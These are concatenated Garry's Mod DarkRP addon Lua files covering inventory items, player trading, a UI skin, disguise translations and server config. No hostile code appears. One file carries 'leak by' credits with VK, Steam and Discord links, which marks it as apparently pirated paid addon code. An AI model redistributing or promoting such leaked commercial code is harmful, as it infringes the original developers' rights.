ITEM.Base = "base_darkrp"
ITEM.Stackable = true

function ITEM:SaveData(ent)
    self:SetData("Price", ent:Getprice())
    self:SetData("Owner", ent:Getowning_ent())
end

function ITEM:LoadData(ent)
    ent:Setprice(self:GetData("Price"))
    ent:Setowning_ent(self:GetData("Owner"))
end
--PATH addons/truefishing/lua/itemstore/items/rod_fish.lua:
ITEM.Name = itemstore.Translate( "rod_fish" )
ITEM.Description = itemstore.Translate( "fish_desc" )
ITEM.Model = "models/props/cs_militia/fishriver01.mdl"
ITEM.HighlightColor = itemstore.config.HighlightColours.Other
ITEM.Base = "base_darkrp"
ITEM.Stackable = true

function ITEM:GetName()
	return TrueFishGetFishName( self:GetData( "FishID" ) )
end

function ITEM:GetDescription()
	local desc = self.Description

	-- TrueFishGetFishName( self:GetData( "FishID" ) )

	return "Выловлена в местных водоёмах." --self:GetData( "Description", string.format( desc ) )
end

function ITEM:CanMerge( item )
	return self.Stackable and item:GetClass() == self:GetClass() and
		item:GetData( "FishID" ) == self:GetData( "FishID" ) and
		self.MaxStack >= self:GetAmount() + item:GetAmount()
end

function ITEM:LoadData( ent )
	ent.fishID = self:GetData("FishID")
	ent:SetModel( TrueFishGetFishModel( self:GetData("FishID") ) )
	
	function ent:Initialize()
		self:PhysicsInit( SOLID_VPHYSICS )
		self:SetMoveType( MOVETYPE_VPHYSICS )
		self:SetSolid( SOLID_VPHYSICS )
		self:SetUseType( SIMPLE_USE )
		self:GetPhysicsObject():Wake()

		self:SetCollisionGroup( COLLISION_GROUP_INTERACTIVE_DEBRIS )
	end
end

function ITEM:SaveData( ent )
	self:SetData( "FishID" , ent.fishID )
	self:SetData( "Model", TrueFishGetFishModel( ent.fishID ) )
end

if SERVER then
	hook.Add("ItemStoreCanWrite","no_fish_drop",function(_,action,_,item)
		if action =="drop" and item:GetClass() == "rod_fish" then
			return false
		end
	end)	
end

--PATH addons/itemstore_new/lua/itemstore/items/spawned_food.lua:
﻿ITEM.Name = itemstore.Translate("food_name")
ITEM.Description = itemstore.Translate("food_desc")
ITEM.Model = "models/props_junk/watermelon01.mdl"
ITEM.HighlightColor = itemstore.config.HighlightColours.Consumables
ITEM.Base = "base_darkrp"

ITEM.Foods = {
    ["models/props_junk/watermelon01.mdl"] = itemstore.Translate("food_melon"),
    ["models/props/cs_italy/orange.mdl"] = itemstore.Translate("food_orange"),
    ["models/props/cs_italy/bananna_bunch.mdl"] = itemstore.Translate("food_bananas"),
    ["models/props/cs_italy/bananna.mdl"] = itemstore.Translate("food_banana"),
    ["models/props_junk/glassbottle01a.mdl"] = itemstore.Translate("food_glassbottle"),
    ["models/props_junk/popcan01a.mdl"] = itemstore.Translate("food_soda"),
    ["models/props_junk/garbage_milkcarton002a.mdl"] = itemstore.Translate("food_milk"),
    ["models/props_junk/garbage_glassbottle002a.mdl"] = itemstore.Translate("food_beer"),
    ["models/props_junk/garbage_plasticbottle003a.mdl"] = itemstore.Translate("food_twolitresoda"),
    ["models/props_junk/garbage_glassbottle001a.mdl"] = itemstore.Translate("food_onelitresoda"),
    ["models/props_junk/garbage_glassbottle003a.mdl"] = itemstore.Translate("food_glassbottle")
}

function ITEM:GetName()
    local name = self.Name

    if self.Foods[self:GetModel()] then
        name = self.Foods[self:GetModel()]
    end

    return self:GetData("Name", name)
end

function ITEM:GetDescription()
    return self:GetData("Description", string.format(self.Description, self:GetData("Nutrition", 1)))
end

function ITEM:Use(pl)
    local energy = pl:getDarkRPVar("Energy") + self:GetData("Nutrition", 1)
    pl:setSelfDarkRPVar("Energy", math.Clamp(energy, 0, 100))
    umsg.Start("AteFoodIcon", pl)
    umsg.End()
    pl:EmitSound("npc/barnacle/barnacle_crunch2.wav")

    return self:TakeOne()
end

function ITEM:SaveData(ent)
    self:SetData("Owner", ent:Getowning_ent())
    self:SetData("Nutrition", ent.FoodEnergy)
    self:SetModel(ent:GetModel())
end

function ITEM:LoadData(ent)
    ent:Setowning_ent(self:GetData("Owner"))
    ent:SetModel(self:GetModel())
    ent.FoodEnergy = self:GetData("Nutrition")

    -- One day fptje is gonna have some feces mailed to his house or something, christ
    for k, v in ipairs(FoodItems) do
        if v.model == self:GetModel() then
            ent.foodItem = v
            break
        end
    end
end
--PATH addons/zeros_methlab2/lua/itemstore/items/zmlab2_item_crate.lua:
--leak by matveicher and Партизан
--vk group - https://vk.com/gmodffdev
--steam - https://steamcommunity.com/profiles/76561198968457747/
--ds server - https://discord.gg/V329W7Ce8g
--ds - matveicher and angeldead.
ITEM.Name = "Crate"
ITEM.Description = "Some meth info."
ITEM.Model = "models/zerochain/props_methlab/zmlab2_crate.mdl"
ITEM.Base = "base_darkrp"
ITEM.Stackable = false
ITEM.DropStack = false

function ITEM:GetName()
	local name = "Unkown"

	local m_type = self:GetData("MethType")
	local m_qual = self:GetData("MethQuality")
	local m_amount = self:GetData("MethAmount")

	local MethData = zmlab2.config.MethTypes[m_type]
	if MethData then
		name = MethData.name .. " " .. (m_amount or 0) .. zmlab2.config.UoM .. " " .. (m_qual or 0) .. "%"
	end
	return self:GetData("Name", name)
end

function ITEM:GetDescription()

	local desc = "Unkown"
	local MethType = self:GetData("MethType")
	if zmlab2.config.MethTypes[MethType] then desc = zmlab2.config.MethTypes[MethType].desc end
	return self:GetData("Description", desc)
end

function ITEM:GetColor()

	local col = Color(255,255,255,255)
	local MethType = self:GetData("MethType")
	local MethData = zmlab2.config.MethTypes[MethType]
	if MethData then

		local m_qual = self:GetData("MethQuality")
		local qual_fract = (1 / 100) * m_qual

		col = MethData.color

		local h,s,v = ColorToHSV(col)
		s = s * qual_fract

		col = HSVToColor(h,s,v)
	end
	return self:GetData("Color", col)
end


// We save the uniqueid to be save should the ingredients config order or item count change
function ITEM:SaveData(ent)
	self:SetData("MethType", ent:GetMethType())
	self:SetData("MethQuality", ent:GetMethQuality())
	self:SetData("MethAmount", ent:GetMethAmount())
end

// Get the list id using the uniqueid and set it in the entity
function ITEM:LoadData(ent)
	local m_type = self:GetData("MethType")
	local m_qual = self:GetData("MethQuality")
	local m_amount = self:GetData("MethAmount")
	if m_type and m_qual and m_amount then
		ent:SetMethType(m_type)
		ent:SetMethQuality(m_qual)
		ent:SetMethAmount(m_amount)
	else
		SafeRemoveEntity(ent)
	end
end

function ITEM:Drop(ply,con,slot,ent)
	if not IsValid(ent) then return end
	zclib.Player.SetOwner(ent, ply)
end
--leak by matveicher and Партизан
--vk group - https://vk.com/gmodffdev
--steam - https://steamcommunity.com/profiles/76561198968457747/
--ds server - https://discord.gg/V329W7Ce8g
--ds - matveicher and angeldead.
--PATH addons/itemstore_new/lua/itemstore/trading.lua:
﻿itemstore.trading = {}
local Trade = {}

function Trade:GetSide(pl)
    if self.Right.Player == pl then
        return self.Right
    elseif self.Left.Player == pl then
        return self.Left
    end
end

function Trade:SetMoneyOffer(pl, offer)
    local side = self:GetSide(pl)

    if side then
        side.Money = math.Clamp(offer, 0, itemstore.gamemodes.GetMoney(pl))

        if SERVER then
            self:Sync()
        end
    end
end

function Trade:GetMoneyOffer(pl)
    local side = self:GetSide(pl)
    if side then return side.Money end
end

function Trade:SetReady(pl, ready)
    local side = self:GetSide(pl)

    if side then
        side.Ready = ready

        if SERVER then
            self:Sync()
        end
    end
end

function Trade:GetReady(pl)
    local side = self:GetSide(pl)
    if side then return side.Ready end
end

function Trade:IsReady()
    return self.Left.Ready and self.Right.Ready
end

if SERVER then
    util.AddNetworkString("ItemStoreTrade")

    function Trade:Sync()
        net.Start("ItemStoreTrade")
        net.WriteEntity(self.Left.Player)
        net.WriteUInt(self.Left.Money, 32)
        net.WriteUInt(self.Left.Container:GetID(), 32)
        net.WriteBit(self.Left.Ready)
        net.WriteEntity(self.Right.Player)
        net.WriteUInt(self.Right.Money, 32)
        net.WriteUInt(self.Right.Container:GetID(), 32)
        net.WriteBit(self.Right.Ready)

        net.Send({self.Left.Player, self.Right.Player})
    end

    util.AddNetworkString("ItemStoreCloseTrade")

    function Trade:Close()
        if IsValid(self.Left.Player) then
            for k, v in pairs(self.Left.Container:GetItems()) do
                self.Left.Player.Inventory:AddItem(v)
            end
        end

        itemstore.containers.Remove(self.Left.Container:GetID())

        if IsValid(self.Right.Player) then
            for k, v in pairs(self.Right.Container:GetItems()) do
                self.Right.Player.Inventory:AddItem(v)
            end
        end

        itemstore.containers.Remove(self.Right.Container:GetID())
        self.Left.Player.Trade = nil
        self.Right.Player.Trade = nil
        net.Start("ItemStoreCloseTrade")

        net.Send({self.Left.Player, self.Right.Player})
    end

    function Trade:Accept()
        if not self:IsReady() then return end

        if IsValid(self.Left.Player) and IsValid(self.Right.Player) then
            local leftmoney = itemstore.gamemodes.GetMoney(self.Left.Player)
            local rightmoney = itemstore.gamemodes.GetMoney(self.Right.Player)

            if leftmoney >= self.Left.Money and rightmoney >= self.Right.Money then
                for k, v in pairs(self.Left.Container:GetItems()) do
                    self.Left.Container:SetItem(k, nil)
                    self.Right.Player.Inventory:AddItem(v)
                end

                for k, v in pairs(self.Right.Container:GetItems()) do
                    self.Right.Container:SetItem(k, nil)
                    self.Left.Player.Inventory:AddItem(v)
                end

                itemstore.gamemodes.GiveMoney(self.Left.Player, -self.Left.Money)
                itemstore.gamemodes.GiveMoney(self.Left.Player, self.Right.Money)
                itemstore.gamemodes.GiveMoney(self.Right.Player, self.Left.Money)
                itemstore.gamemodes.GiveMoney(self.Right.Player, -self.Right.Money)
            else
                self.Left.Player:ChatPrint(itemstore.Translate("trade_failed"))
                self.Right.Player:ChatPrint(itemstore.Translate("trade_failed"))
            end
        end

        self:Close()
    end

    util.AddNetworkString("ItemStoreTradeMessage")

    function Trade:Message(pl, message)
        net.Start("ItemStoreTradeMessage")
        net.WriteEntity(pl)
        net.WriteString(message)

        net.Send({self.Left.Player, self.Right.Player})
    end
else
    function Trade:SendMessage(message)
        net.Start("ItemStoreTradeMessage")
        net.WriteString(message)
        net.SendToServer()
    end
end

function itemstore.Trade(left, right, con_left, con_right)
    local trade = {
        Left = {
            Player = left,
            Money = 0,
            Container = con_left or itemstore.Container(4, 3, 1),
            Ready = false
        },
        Right = {
            Player = right,
            Money = 0,
            Container = con_right or itemstore.Container(4, 3, 1),
            Ready = false
        }
    }

    setmetatable(trade, {
        __index = Trade
    })

    left.Trade = trade
    right.Trade = trade

    if SERVER then
        trade.Left.Container:SetPermissions(left, true, true)
        trade.Left.Container:SetPermissions(right, true, false)

        trade.Left.Container:AddCallback("set", function(slot, item)
            trade:SetReady(trade.Left.Player, false)
            trade:SetReady(trade.Right.Player, false)
        end)

        trade.Left.Container:Sync()
        trade.Right.Container:SetPermissions(left, true, false)
        trade.Right.Container:SetPermissions(right, true, true)

        trade.Right.Container:AddCallback("set", function(slot, item)
            trade:SetReady(trade.Left.Player, false)
            trade:SetReady(trade.Right.Player, false)
        end)

        trade.Right.Container:Sync()
        trade:Sync()
    end

    return trade
end

if SERVER then
    --[[
	util.AddNetworkString( "ItemStoreStartTrade" )
	net.Receive( "ItemStoreStartTrade", function( len, pl )
		local partner = net.ReadEntity()

		if not  IsValid( partner ) or not partner:IsPlayer() then
			itemstore.Trade( pl, partner )
		end
	end )
	]]
    util.AddNetworkString("ItemStoreReadyTrade")

    net.Receive("ItemStoreReadyTrade", function(len, pl)
        if pl.Trade then
            pl.Trade:SetReady(pl, net.ReadBit() == 1)
        end
    end)

    util.AddNetworkString("ItemStoreAcceptTrade")

    net.Receive("ItemStoreAcceptTrade", function(len, pl)
        if pl.Trade then
            pl.Trade:Accept()
        end
    end)

    util.AddNetworkString("ItemStoreCloseTrade")

    net.Receive("ItemStoreCloseTrade", function(len, pl)
        if pl.Trade then
            pl.Trade:Close()
        end
    end)

    util.AddNetworkString("ItemStoreTradeMoney")

    net.Receive("ItemStoreTradeMoney", function(len, pl)
        if pl.Trade then
            pl.Trade:SetMoneyOffer(pl, net.ReadUInt(32))
        end
    end)

    util.AddNetworkString("ItemStoreTradeMessage")

    net.Receive("ItemStoreTradeMessage", function(len, pl)
        if pl.Trade then
            pl.Trade:Message(pl, net.ReadString())
        end
    end)
else
    itemstore.trading.Panel = nil

    net.Receive("ItemStoreTrade", function()
        left_pl = net.ReadEntity()
        left_money = net.ReadUInt(32)
        left_con = itemstore.containers.Get(net.ReadUInt(32))
        left_ready = net.ReadBit() == 1
        right_pl = net.ReadEntity()
        right_money = net.ReadUInt(32)
        right_con = itemstore.containers.Get(net.ReadUInt(32))
        right_ready = net.ReadBit() == 1
        local trade = itemstore.Trade(left_pl, right_pl, left_con, right_con)
        trade.Left.Money = left_money
        trade.Left.Ready = left_ready
        trade.Right.Money = right_money
        trade.Right.Ready = right_ready
        LocalPlayer().Trade = trade

        if not IsValid(itemstore.trading.Panel) then
            if trade.Left.Player == LocalPlayer() then
                itemstore.trading.Panel = vgui.Create("ItemStoreTrade")
                itemstore.trading.Panel:Center()
                itemstore.trading.Panel:MakePopup()
            else
                itemstore.trading.Panel = vgui.Create("ItemStoreTradeRequest")
                itemstore.trading.Panel:SetSize(200, 100)
                itemstore.trading.Panel:SetPos(ScrW() - itemstore.trading.Panel:GetWide(), 0)
            end
        end

        itemstore.trading.Panel:Refresh()
    end)

    net.Receive("ItemStoreCloseTrade", function()
        LocalPlayer().Trade = nil

        if IsValid(itemstore.trading.Panel) then
            itemstore.trading.Panel:Close()
        end
    end)

    net.Receive("ItemStoreTradeMessage", function()
        if IsValid(itemstore.trading.Panel) and itemstore.trading.Panel.ChatMessage then
            itemstore.trading.Panel:ChatMessage(net.ReadEntity(), net.ReadString())
        end
    end)
end
--PATH addons/itemstore_new/lua/itemstore/skins/flat.lua:
﻿local SKIN = {}
SKIN.GradientUp = Material("gui/gradient_up")
SKIN.GradientDown = Material("gui/gradient_down")
SKIN.Blur = Material("pp/blurscreen")

function SKIN:PaintFrame(panel, w, h)
    self.Blur:SetFloat("$blur", 8)
    self.Blur:Recompute()
    render.UpdateScreenEffectTexture()
    local x, y = panel:LocalToScreen(0, 0)
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(self.Blur)
    surface.DrawTexturedRect(x * -1, y * -1, ScrW(), ScrH())
    surface.SetDrawColor(Color(30, 30, 30, 200))
    surface.DrawRect(0, 22, w, h - 22)
    surface.SetDrawColor(Color(44, 62, 80))
    surface.DrawRect(0, 0, w, 22)
end

function SKIN:PaintButton(panel, w, h)
    surface.SetDrawColor(Color(200, 200, 200))
    surface.DrawRect(0, 0, w, h)

    if not panel.Disabled then
        surface.SetMaterial(panel.Depressed and self.GradientUp or self.GradientDown)
        surface.SetDrawColor(panel.Hovered and Color(240, 240, 240) or Color(230, 230, 230))
        surface.DrawTexturedRect(0, 0, w, h)
    end

    surface.SetDrawColor(Color(0, 0, 0, 150))
    surface.DrawOutlinedRect(0, 0, w, h)
end

function SKIN:PaintTab(panel, w, h)
    if panel:IsActive() then
        draw.RoundedBoxEx(2, 2, 0, w - 5, h - 8, Color(0, 0, 0, 200), true, true, false, false)
    else
        draw.RoundedBoxEx(2, 2, 0, w - 5, h, Color(0, 0, 0, 150), true, true, false, false)
    end
end

function SKIN:PaintPropertySheet(panel, w, h)
    surface.SetDrawColor(Color(0, 0, 0, 200))
    surface.DrawRect(0, 20, w, h)
end

function SKIN:PaintCategoryList(panel, w, h)
end

function SKIN:PaintCollapsibleCategory(panel, w, h)
    surface.SetDrawColor(Color(0, 0, 0, 150))
    surface.DrawRect(0, 0, w, 20)
    surface.SetDrawColor(Color(0, 0, 0, 150))
    surface.DrawRect(0, 0, w, h)
end

function SKIN:PaintWindowCloseButton(panel, w, h)
    local col = Color(0, 0, 0, 50)

    if not panel:GetDisabled() and panel.Hovered then
        if panel:IsDown() then
            col = Color(192, 57, 43)
        else
            col = Color(231, 76, 60)
        end
    end

    draw.RoundedBoxEx(4, 0, 2, w, 18, col, true, true, true, true)
    draw.SimpleText("r", "Marlett", w / 2, 11, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

function SKIN:PaintWindowMaximizeButton(panel, w, h)
    if panel:GetDisabled() then return end
    local col = Color(0, 0, 0, 50)

    if panel.Hovered then
        if panel:IsDown() then
            col = Color(41, 128, 185)
        else
            col = Color(52, 152, 219)
        end
    end

    draw.RoundedBoxEx(4, 0, 2, w, 18, col, false, false, false, false)
    draw.SimpleText("1", "Marlett", w / 2, 11, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

function SKIN:PaintWindowMinimizeButton(panel, w, h)
    if true then return end
    local col = Color(0, 0, 0, 50)

    if panel.Hovered then
        if panel:IsDown() then
            col = Color(41, 128, 185)
        else
            col = Color(52, 152, 219)
        end
    end

    draw.RoundedBoxEx(4, 0, 2, w, 18, col, true, false, true, false)
    draw.SimpleText("0", "Marlett", w / 2, 11, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end

derma.DefineSkin("itemstore", "Flat skin for ItemStore", SKIN)
--PATH addons/deceive/lua/deceive/translations/us.lua:

return {
	-- UI

	disguise_ui_title				= "Маскировка",

	disguise_ui_row_name			= "Имя",
	disguise_ui_row_job 			= "Профессия",

	disguise_ui_info_player 		= "Имя:",
	disguise_ui_info_job 			= "Профессия:",
	disguise_ui_info_gunlicensed	= "Лицензия:",
	disguise_ui_info_wanted			= "Розыск:",
	disguise_ui_info_arrested		= "Арестован:",

	disguise_ui_yes 				= "Да",
	disguise_ui_no 					= "Нет",

	disguise_ui_action				= "Замаскироваться",

	disguise_ui_undisguise1			= "Чтобы выключить маскировку напишите /%s",
	disguise_ui_undisguise2			= "",

	disguise_ui_invalid_target		= "Ваша цель больше не действительна!",

	-- Server notifications

	disguise_successful				= "Вы замаскировались под: %s.",
	disguise_removed 				= "Ваша маскировка удалилась.",

	disguise_removed_jobchange		= "Ваша маскировка была удалена, потому что вы изменили профессию.",
	disguise_warn_disconnect 		= "Внимание: игрок, под которого вы замаскировали, просто отключился от сервера!",
	disguise_blown					= "Ваша маскировка была отключена, потому что вы стреляли из оружия!",

	disguise_cooldown				= "Подождите: %s.",
	disguise_disallowed_as			= "Вы не можете замаскироваться под кого-либо с вашей текущей профессией. (%s)",
	disguise_disallowed_to			= "Вы не можете замаскироваться под этого игрока из-за его профессии. (%s)",
	disguise_self 					= "Ты не можешь маскироваться под себя...",
	disguise_none 					= "У тебя нет маскировки!",

	disguise_drawer_usedup			= "В ящике закончились комплекты маскировки!",

	-- Disguise SWEP help

	swep_disguise_briefcase 		= "Маскировка",
	swep_disguise_briefcase_title	= "",
	swep_disguise_briefcase_text	= "",
	swep_disguise_briefcase_help1	= "",
	swep_disguise_briefcase_help2	= "",
}


--PATH addons/bricks_gangs/lua/bricks_server/bricks_gangs/sh_clientconfig.lua:
--[[
    !!WARNING!!
        ALL CONFIG IS DONE INGAME, DONT EDIT ANYTHING HERE
        Type !bricksserver ingame or use the f4menu
    !!WARNING!!
]]--

-- Gangs --
if( BRICKS_SERVER.Func.IsModuleEnabled( "gangs" ) ) then
    BRICKS_SERVER.BASECLIENTCONFIG.GangMenuBind = { BRICKS_SERVER.Func.L( "gangMenuBind" ), "bind", 0 }
end
--PATH addons/brick_s_server_framework/lua/bricks_server/bricks_server_devcfg_main.lua:
--[[
    !!WARNING!!
        ALL CONFIG IS DONE INGAME, DONT EDIT ANYTHING HERE
        Type !bricksserver ingame or use the f4menu
    !!WARNING!!
]]--

BRICKS_SERVER.DEVCONFIG.BaseThemes = {}
BRICKS_SERVER.DEVCONFIG.BaseThemes.Red = Color(201, 70, 70)
BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkRed = Color(181, 50, 50)
BRICKS_SERVER.DEVCONFIG.BaseThemes.Green = Color(46, 204, 113)
BRICKS_SERVER.DEVCONFIG.BaseThemes.DarkGreen = Color(39, 174, 96)
BRICKS_SERVER.DEVCONFIG.BaseThemes.Gold = Color(201,176,55)
BRICKS_SERVER.DEVCONFIG.BaseThemes.Silver = Color(180,180,180)
BRICKS_SERVER.DEVCONFIG.BaseThemes.Bronze = Color(173,138,86)
BRICKS_SERVER.DEVCONFIG.BaseThemes.White = Color( 255, 255, 255 )
BRICKS_SERVER.DEVCONFIG.BaseThemes.Black = Color( 0, 0, 2505 )

BRICKS_SERVER.DEVCONFIG.AccentThemes = {}
BRICKS_SERVER.DEVCONFIG.AccentThemes["Turquoise"] = { Color(22, 160, 133), Color(26, 188, 156) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Emerald"] = { Color(39, 174, 96), Color(46, 204, 113) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Blue"] = { Color(41, 128, 185), Color(52, 152, 219) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Amethyst"] = { Color(142, 68, 173), Color(155, 89, 182) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Yellow"] = { Color(243, 156, 18), Color(241, 196, 15) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Orange"] = { Color(211, 84, 0), Color(230, 126, 34) }
BRICKS_SERVER.DEVCONFIG.AccentThemes["Red"] = { Color(181, 50, 50), Color(201, 70, 70) }

BRICKS_SERVER.DEVCONFIG.BackgroundThemes = {}
BRICKS_SERVER.DEVCONFIG.BackgroundThemes["Dark"] = { Color(25, 25, 25), Color(40, 40, 40), Color(49, 49, 49), Color(68, 68, 68), Color( 255, 255, 255 ) }
BRICKS_SERVER.DEVCONFIG.BackgroundThemes["DarkBlue"] = { Color(26, 41, 56), Color(36, 51, 66), Color(44, 62, 80), Color(52, 73, 94), Color( 255, 255, 255 ) }
BRICKS_SERVER.DEVCONFIG.BackgroundThemes["Light"] = { Color(152, 157, 161), Color(170, 177, 182), Color(189, 195, 199), Color(236, 240, 241), Color( 0, 0, 0 ) }
BRICKS_SERVER.DEVCONFIG.BackgroundThemes["Grey"] = { Color(101, 115, 116), Color(111, 125, 126), Color(127, 140, 141), Color(149, 165, 166), Color( 255, 255, 255 ) }

BRICKS_SERVER.DEVCONFIG.EntityTypes = BRICKS_SERVER.DEVCONFIG.EntityTypes or {}
BRICKS_SERVER.DEVCONFIG.EntityTypes["bricks_server_npc"] = { 
    GetDataFunc = function( entity ) 
        return entity:GetNPCKeyVar() or 0
    end,
    SetDataFunc = function( entity, data ) 
        return entity:SetNPCKey( data or 0 )
    end
}

BRICKS_SERVER.DEVCONFIG.NPCTypes = BRICKS_SERVER.DEVCONFIG.NPCTypes or {}

BRICKS_SERVER.DEVCONFIG.WeaponModels = {
    ["weapon_ar2"] = "models/weapons/w_irifle.mdl",
    ["weapon_bugbait"] = "models/weapons/w_bugbait.mdl",
    ["weapon_crossbow"] = "models/weapons/w_crossbow.mdl",
    ["weapon_crowbar"] = "models/weapons/w_crowbar.mdl",
    ["weapon_frag"] = "models/weapons/w_grenade.mdl",
    ["weapon_physcannon"] = "models/weapons/w_Physics.mdl",
    ["weapon_pistol"] = "models/weapons/w_pistol.mdl",
    ["weapon_rpg"] = "models/weapons/w_rocket_launcher.mdl",
    ["weapon_shotgun"] = "models/weapons/w_shotgun.mdl",
    ["weapon_slam"] = "models/weapons/w_slam.mdl",
    ["weapon_smg1"] = "models/weapons/w_smg1.mdl",
    ["weapon_stunstick"] = "models/weapons/w_stunbaton.mdl",
    ["weapon_medkit"] = "models/weapons/w_medkit.mdl",
    ["weapon_physgun"] = "models/weapons/w_Physics.mdl",
    ["gmod_tool"] = "models/weapons/w_toolgun.mdl",

    ["arrest_stick"] = "models/weapons/w_stunbaton.mdl",
    ["unarrest_stick"] = "models/weapons/w_stunbaton.mdl",
    ["stunstick"] = "models/weapons/w_stunbaton.mdl",
    ["weaponchecker"] = "models/weapons/v_hands.mdl",
}

BRICKS_SERVER.DEVCONFIG.KEY_BINDS = {
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z",
    "Numpad 0",
    "Numpad 1",
    "Numpad 2",
    "Numpad 3",
    "Numpad 4",
    "Numpad 5",
    "Numpad 6",
    "Numpad 7",
    "Numpad 8",
    "Numpad 0",
    "Numpad /",
    "Numpad *",
    "Numpad -",
    "Numpad +",
    "Numpad Enter",
    "Numpad .",
    "(",
    ")",
    ";",
    "'",
    "`",
    ",",
    ".",
    "/",
    [[\]],
    "-",
    "=",
    "Enter",
    "Space",
    "Backspace",
    "Tab",
    "Capslock",
    "Numlock",
    "Escape",
    "Scrolllock",
    "Insert",
    "Delete",
    "Home",
    "End",
    "Pageup",
    "Pagedown",
    "Break",
    "Left Shift",
    "Right Shift",
    "Alt",
    "Right Alt",
    "Left Control",
    "Right Control",
    "Left Windows",
    "Right Windows",
    "App",
    "Up",
    "Left",
    "Down",
    "Right",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "F11",
    "F12",
    "Capslock Toggle",
    "Numlock Toggle",
    "Last",
    "Count"
}

-- Inventory --
BRICKS_SERVER.DEVCONFIG.INVENTORY = BRICKS_SERVER.DEVCONFIG.INVENTORY or {}
BRICKS_SERVER.DEVCONFIG.INVENTORY.DefaultEntFuncs = {
    GetItemData = function( ent )
        local itemData = { ent:GetClass(), ent:GetModel() }
        
        return itemData, 1
    end,
    OnSpawn = function( ply, pos, itemData )
        local ent = ents.Create( itemData[1] )
        if( not IsValid( ent ) ) then return end
        ent:SetPos( pos )
        ent:SetModel( itemData[2] )
        ent:Spawn()
        if( ent.CPPISetOwner ) then ent:CPPISetOwner( ply ) end
        if( ent.Setowning_ent ) then ent:Setowning_ent( ply ) end
    end,
    ModelDisplay = function( Panel, itemData )
        if( not Panel.Entity or not IsValid( Panel.Entity ) ) then return end

        local mn, mx = Panel.Entity:GetRenderBounds()
        local size = 0
        size = math.max( size, math.abs(mn.x) + math.abs(mx.x) )
        size = math.max( size, math.abs(mn.y) + math.abs(mx.y) )
        size = math.max( size, math.abs(mn.z) + math.abs(mx.z) )

        Panel:SetFOV( 65 )
        Panel:SetCamPos( Vector( size, size, size ) )
        Panel:SetLookAt( (mn + mx) * 0.5 )
    end,
    GetInfo = function( itemData )
        local name = BRICKS_SERVER.Func.GetList( "entities" )[itemData[1] or ""] or (itemData[1] or "Unknown")
        return { name, "Some " .. name .. ".", (BRICKS_SERVER.CONFIG.INVENTORY.ItemRarities or {})[itemData[1] or ""] }
    end,
    GetItemKey = function( itemData )
        return itemData[1]
    end,
    CanCombine = function( itemData1, itemData2 )
        if( itemData1[1] == itemData2[1] ) then
            return true
        end

        return false
    end,
}

BRICKS_SERVER.DEVCONFIG.RarityTypes = {}
BRICKS_SERVER.DEVCONFIG.RarityTypes["SolidColor"] = {
    Title = "Solid Color"
}
BRICKS_SERVER.DEVCONFIG.RarityTypes["Gradient"] = {
    Title = "Gradient"
}
BRICKS_SERVER.DEVCONFIG.RarityTypes["Fade"] = {
    Title = "Fade"
}
BRICKS_SERVER.DEVCONFIG.RarityTypes["Rainbow"] = {
    Title = "Rainbow"
}

BRICKS_SERVER.DEVCONFIG.Currencies = BRICKS_SERVER.DEVCONFIG.Currencies or {}
local function loadCurrencies()
    if( DarkRP ) then
        BRICKS_SERVER.DEVCONFIG.Currencies["darkrp_money"] = {
            Title = "DarkRP Money",
            getFunction = function( ply )
                return ply:getDarkRPVar( "money" )
            end,
            addFunction = function( ply, amount )
                ply:addMoney( amount )
            end,
            formatFunction = function( amount )
                return DarkRP.formatMoney( amount )
            end
        }
    end

    if( BRICKSCREDITSTORE ) then
        BRICKS_SERVER.DEVCONFIG.Currencies["brcs_credits"] = {
            Title = "Credits",
            getFunction = function( ply )
                return ply:GetBRCS_Credits()
            end,
            addFunction = function( ply, amount )
                ply:AddBRCS_Credits( amount )
            end,
            formatFunction = function( amount )
                return BRICKSCREDITSTORE.FormatCredits( amount )
            end
        }
    end

    if( mTokens ) then
        BRICKS_SERVER.DEVCONFIG.Currencies["mtokens"] = {
            Title = "mTokens",
            getFunction = function( ply )
                return ((SERVER and mTokens.GetPlayerTokens(ply)) or (CLIENT and mTokens.PlayerTokens)) or 0
            end,
            addFunction = function( ply, amount )
                if( amount > 0 ) then
                    mTokens.AddPlayerTokens(ply, amount)
                else
                    mTokens.TakePlayerTokens(ply, math.abs(amount))
                end
            end,
            formatFunction = function( amount )
                return string.Comma( amount ) .. " Tokens"
            end
        }
    end
    
    BRICKS_SERVER.DEVCONFIG.Currencies["ps2_points"] = {
        Title = "PS2 Points",
        getFunction = function( ply )
            return (ply.PS2_Wallet or {}).points or 0
        end,
        addFunction = function( ply, amount )
            ply:PS2_AddStandardPoints( amount )
        end,
        formatFunction = function( amount )
            return string.Comma( amount ) .. " Points"
        end
    }

    BRICKS_SERVER.DEVCONFIG.Currencies["ps2_premium_points"] = {
        Title = "PS2 Premium Points",
        getFunction = function( ply )
            return (ply.PS2_Wallet or {}).premiumPoints or 0
        end,
        addFunction = function( ply, amount )
            ply:PS2_AddPremiumPoints( amount )
        end,
        formatFunction = function( amount )
            return string.Comma( amount ) .. " Premium Points"
        end
    }

    BRICKS_SERVER.DEVCONFIG.Currencies["ps1_points"] = {
        Title = "PS1 Points",
        getFunction = function( ply )
            return ply:PS_GetPoints() or 0
        end,
        addFunction = function( ply, amount )
            ply:PS_GivePoints( amount )
        end,
        formatFunction = function( amount )
            return string.Comma( amount ) .. " Points"
        end
    }

    if( SH_POINTSHOP ) then
        BRICKS_SERVER.DEVCONFIG.Currencies["sh_points"] = {
            Title = "SH Points",
            getFunction = function( ply )
                return ply:SH_GetStandardPoints()
            end,
            addFunction = function( ply, amount )
